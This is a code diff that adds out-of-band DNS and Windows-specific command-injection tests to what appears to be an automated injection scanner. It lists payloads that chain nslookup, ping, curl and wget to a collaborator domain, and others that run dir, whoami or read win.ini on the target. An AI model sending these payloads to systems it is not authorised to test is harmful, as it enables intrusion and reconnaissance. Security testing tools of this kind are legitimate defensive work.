@@ -212,6 +212,61 @@ class AutoCMD:
 
         return {"tested": len(results), "vulnerable": False, "results": results}
 
+    def test_oob_dns(self, collaborator_domain: str) -> dict:
+        """Test blind command injection via DNS callback.
+
+        Uses nslookup/ping to trigger DNS lookup to collaborator domain.
+        """
+        oob_payloads = [
+            ("nslookup_pipe", f"|nslookup {collaborator_domain}"),
+            ("nslookup_semi", f";nslookup {collaborator_domain}"),
+            ("nslookup_and", f"&&nslookup {collaborator_domain}"),
+            ("nslookup_or", f"||nslookup {collaborator_domain}"),
+            ("nslookup_backtick", f"`nslookup {collaborator_domain}`"),
+            ("nslookup_dollar", f"$(nslookup {collaborator_domain})"),
+            ("ping_pipe", f"|ping -c 1 {collaborator_domain}"),
+            ("curl_pipe", f"|curl http://{collaborator_domain}"),
+            ("wget_pipe", f"|wget http://{collaborator_domain}"),
+        ]
+
+        for name, payload in oob_payloads:
+            result = self._send(payload)
+            if result.get("status") == 200:
+                return {
+                    "vulnerable": True,
+                    "technique": "oob_dns",
+                    "payload": payload,
+                    "note": f"Check Collaborator for DNS callback from {collaborator_domain}",
+                }
+
+        return {"vulnerable": False, "technique": "oob_dns"}
+
+    def test_windows_specific(self) -> dict:
+        """Test Windows-specific command injection."""
+        windows_payloads = [
+            ("dir_pipe", "|dir"),
+            ("dir_semi", ";dir"),
+            ("type_pipe", "|type C:\\windows\\win.ini"),
+            ("ipconfig_pipe", "|ipconfig"),
+            ("whoami_pipe", "|whoami"),
+        ]
+
+        for name, payload in windows_payloads:
+            result = self._send(payload)
+            body = result.get("body", "")
+            if any(x in body.lower() for x in ["windows", "program files", "users", "inetpub"]):
+                self.vulnerable = True
+                self.injection_type = "windows"
+                self.working_payload = payload
+                return {
+                    "vulnerable": True,
+                    "technique": "windows",
+                    "payload": payload,
+                    "evidence": body[:200],
+                }
+
+        return {"vulnerable": False, "technique": "windows"}
+
     def run_full_scan(self) -> dict:
         """Run complete automated command injection scan."""
         start = time.time()
